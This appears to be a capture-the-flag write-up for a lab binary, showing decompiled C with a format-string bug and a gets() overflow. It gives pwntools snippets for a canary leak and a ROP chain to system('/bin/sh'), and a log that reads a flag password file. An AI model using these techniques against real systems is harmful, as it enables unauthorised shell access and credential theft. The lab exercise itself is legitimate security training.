Analyzing the decompiled code, the node processing and routing logic are non-exploitative distractions. The critical execution path lies within `console_handshake()` and `process_input()`:

```c
void console_handshake(void) {
    char buf[64]; // Allocated at -0x50(%rbp)

    printf("[NEUROMANCER] Console handle: ");
    fflush(stdout);

    if (fgets(buf, sizeof(buf), stdin) != NULL) {
        printf("[NEUROMANCER] Trace echo: ");
        printf(buf); // Format string vulnerability
    }
}

void process_input(void) {
    char buf[128]; // Allocated at -0x90(%rbp)

    printf("[NEUROMANCER] Interface: ");
    fflush(stdout);

    /* 
     * VULNERABILITY: Unbounded Buffer Overflow
     * gets() reads unbounded input into a 128-byte stack buffer
     */
    gets(buf);

    if (strncmp(buf, "NODE:", 5) == 0) {
        int idx = (int)strtoul(buf + 5, NULL, 10);
        show_node(idx);
    }
    else if (strncmp(buf, "LIST", 4) == 0) {
        for (int i = 0; i < node_count; i++) {
            show_node(i);
        }
    } 
    else {
        puts("[NEUROMANCER] Unknown command.");
    }
}

void handle_command(void) {
    info_leak();
    console_handshake();
    process_input();
}

int main(void) {
    init_nodes();
    print_banner();
    handle_command();
    return 0;
}

```

The attack proceeds in two stages:

1. **Canary Leak (`console_handshake`)**:
`buf` is allocated at `-0x50(%rbp)`. The stack canary resides at `-0x8(%rbp)` (`0x48` bytes offset). In x86-64 calling conventions, adding the 6 register arguments gives the format string index:
$$\text{Canary Offset} = \frac{0x50 - 8}{8} + 6 = \frac{72}{8} + 6 = 15$$


Passing `%15$p` leaks the active canary value:
```python
p.recvuntil(b"[NEUROMANCER] Console handle: ")
p.sendline(b"%15$p")

canary_string = p.recvline().strip()[len(b"[NEUROMANCER] Trace echo: "):]
canary = int(canary_string, 16)

```


2. **Stack Buffer Overflow & ROP Chain (`process_input`)**:
In `process_input`, `buf` is allocated at `-0x90(%rbp)`. The distance from the start of `buf` to the stack canary is `0x90 - 0x8 = 0x88` (136 bytes). Using `gets(buf)`, we overwrite the buffer, preserve the leaked canary, supply an 8-byte dummy `RBP`, and append our ROP chain to execute `setreuid(1026, 1026)` and `system("/bin/sh")`:
```python
p.recvuntil(b"[NEUROMANCER] Interface: ")
offset = 136 
payload = b'\x00' * offset + p64(canary) + p64(0) + rop_chain
p.sendline(payload)
p.interactive()

```



**Execution & Flag Capture:**

```sh
level09@rainfall:~$ echo "" > exploit.py  && vim exploit.py  && python3 exploit.py 
[+] Starting local process '/home/level09/neuromancer': pid 1234
[*] Switching to interactive mode
[NEUROMANCER] Unknown command.
$ whoami
flag09
$ cat /home/flag09/.pass
kl9th7ox72218n3jlf554eymtlaynogo
```